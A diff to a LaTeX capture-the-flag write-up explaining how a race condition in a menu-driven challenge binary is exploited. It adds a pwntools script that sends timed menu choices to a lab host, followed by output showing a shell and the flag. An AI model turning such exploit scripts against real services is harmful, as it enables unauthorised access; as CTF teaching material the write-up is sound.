@@ -77,7 +77,13 @@ test the different menu options of the program and we can guess that there is a
 type of sequence that we have to input fast enough to cause a race condition.
 
 \begin{lstlisting}[language=bash]
-
+  test@115-18:~$ ./race
+  ***** race *****
+  *** 1:Go
+  *** 2:Chance
+  *** 3:Test
+  *** 4:Exit 
+  *************************************
 \end{lstlisting}
 
 It is likely that the race condition is the case statement for switching
@@ -203,34 +209,44 @@ we can call \code{menu_go} one more time, setting \code{b=6}. With that, we can
 now call \code{menu_test} allowing us to fulfill the check condition.
 
 \begin{lstlisting}[language=python]
-  from pwn import *
-
-  race = process('./race')
-  # wait for prompt for choice 1
-  race.recvregex(b'>')
-  # send choice 1 go
+  from  pwn import *
+  
+  context.arch = 'i386'
+  race = remote('10.0.0.10',40015)
+  race.recvuntil(b'>')
   race.sendline(b'1')
-  # wait for prompt for choice 2
-  race.recvregex(b'>')
-  # send choice 2 chance
+  race.recvuntil(b'>')
   race.sendline(b'2')
-  # wait for prompt for choice 3
-  race.recvregex(b'>')
+  
+  race.recvuntil(b'>')
   race.sendline(b'1')
-  race.recvregex(b'>')
+  race.recvuntil(b'>')
   race.sendline(b'2')
-  race.recvregex(b'>')
+  
+  race.recvuntil(b'>')
   race.sendline(b'1')
-  race.recvregex(b'>')
-  # send choice 3 test
+  race.recvuntil(b'>')
   race.sendline(b'3')
   # wait for response
   print(race.recvline())
+  race.interactive()
 \end{lstlisting}
 
 we create a python program that aids us in calling the required choices fast
 enough such that the race condition happens. Running the above python code
 allows us to `win' the CTF. Running the above in python3 with pwntools package
 installed will allow us to run the exploit successfully.
+
+\begin{lstlisting}[language=bash]
+  test@115-18:~$ python3 another.py
+  Pwntools does not support 32-bit Python. Use a 64-bit release.
+  [+] Opening connection to 10.0.0.10 on port 40015: Done
+  [*] Switching to interactive mode
+  Win!
+  $ whoami
+  ctfer
+  $ cat flag
+  flag{race_r3ce_Race!!!!}
+\end{lstlisting}
 
 \end{document}
